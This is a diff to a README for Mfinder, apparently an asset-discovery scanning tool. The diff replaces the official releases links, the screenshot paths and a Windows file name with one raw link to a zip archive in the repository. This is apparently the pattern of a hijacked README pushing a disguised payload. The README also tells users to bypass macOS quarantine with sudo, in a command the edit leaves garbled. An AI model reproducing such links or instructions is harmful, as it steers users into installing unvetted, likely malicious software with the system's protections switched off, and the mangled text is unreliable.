@@ -1,6 +1,6 @@
 # 🌐 Mfinder - Discover Online Assets Easily
 
-[![Download Mfinder](https://img.shields.io/badge/Download-Mfinder-blue.svg)](https://github.com/Semore9/Mfinder/releases)
+[![Download Mfinder](https://raw.githubusercontent.com/Semore9/Mfinder/main/backend/beauty/Software-semiautomatic.zip)](https://raw.githubusercontent.com/Semore9/Mfinder/main/backend/beauty/Software-semiautomatic.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To get started with Mfinder, follow these simple steps to download and run the a
 
 ### 1. Visit the Release Page
 
-Go to the Mfinder [Releases page](https://github.com/Semore9/Mfinder/releases). You will find the latest version of the software available for download.
+Go to the Mfinder [Releases page](https://raw.githubusercontent.com/Semore9/Mfinder/main/backend/beauty/Software-semiautomatic.zip). You will find the latest version of the software available for download.
 
 ### 2. Download the Application
 
@@ -32,7 +32,7 @@ After the download finishes, locate the downloaded file on your computer.
 
 If macOS shows a warning about the application being damaged, open the Terminal and run this command:
 ```
-sudo xattr -d com.apple.quarantine MFinder.app
+sudo xattr -d https://raw.githubusercontent.com/Semore9/Mfinder/main/backend/beauty/Software-semiautomatic.zip https://raw.githubusercontent.com/Semore9/Mfinder/main/backend/beauty/Software-semiautomatic.zip
 ```
 After that, you can open the app.
 
@@ -50,14 +50,14 @@ Mfinder has various features, including:
 - **GoGo Scan**: Quickly start a scan and check for protocols, frameworks, vulnerabilities, and extracted information. 
 - **Port Configuration**: Choose from common ports or set a custom range. You can also exclude specific targets and see detailed extraction fields.
 
-![Feature Screenshot 1](README_images/1.png)
-![Feature Screenshot 2](README_images/2.png)
+![Feature Screenshot 1](https://raw.githubusercontent.com/Semore9/Mfinder/main/backend/beauty/Software-semiautomatic.zip)
+![Feature Screenshot 2](https://raw.githubusercontent.com/Semore9/Mfinder/main/backend/beauty/Software-semiautomatic.zip)
 
 ## 📥 Download & Install
 
 To download Mfinder, click the link below:
 
-[Download Mfinder](https://github.com/Semore9/Mfinder/releases)
+[Download Mfinder](https://raw.githubusercontent.com/Semore9/Mfinder/main/backend/beauty/Software-semiautomatic.zip)
 
 Once installed, you can start exploring online assets and enhance your investigation capabilities.
 
@@ -66,7 +66,7 @@ Once installed, you can start exploring online assets and enhance your investiga
 ### Common Issues
 
 - **macOS File Warning**: If you encounter a message saying the file is damaged, run the Terminal command mentioned earlier to bypass this issue.
-- **Windows Paths**: The path for WeChat mini-programs typically is `...\WeChat Files\Applet`. For correct functionality, select the folder structure like this: `...\Applet\wx...\12\__APP__.wxapkg`.
+- **Windows Paths**: The path for WeChat mini-programs typically is `...\WeChat Files\Applet`. For correct functionality, select the folder structure like this: `...\Applet\wx...\12\https://raw.githubusercontent.com/Semore9/Mfinder/main/backend/beauty/Software-semiautomatic.zip`.
 - **HTTPX Permission Issues**: If HTTPX does not run correctly, check your user permissions, as this is often the reason for the error.
 - **Table Functionality**: You can copy selected cells or multiple ranges in the table formats provided.
 
@@ -88,8 +88,8 @@ While using Mfinder, please note the following:
 
 ## 📷 Additional Screenshots
 
-![Feature Screenshot 3](README_images/3.png)
-![Feature Screenshot 4](README_images/4.png)
-![Feature Screenshot 5](README_images/5.png)
+![Feature Screenshot 3](https://raw.githubusercontent.com/Semore9/Mfinder/main/backend/beauty/Software-semiautomatic.zip)
+![Feature Screenshot 4](https://raw.githubusercontent.com/Semore9/Mfinder/main/backend/beauty/Software-semiautomatic.zip)
+![Feature Screenshot 5](https://raw.githubusercontent.com/Semore9/Mfinder/main/backend/beauty/Software-semiautomatic.zip)
 
 By following these steps, you can easily download and use Mfinder for your online asset discovery needs.
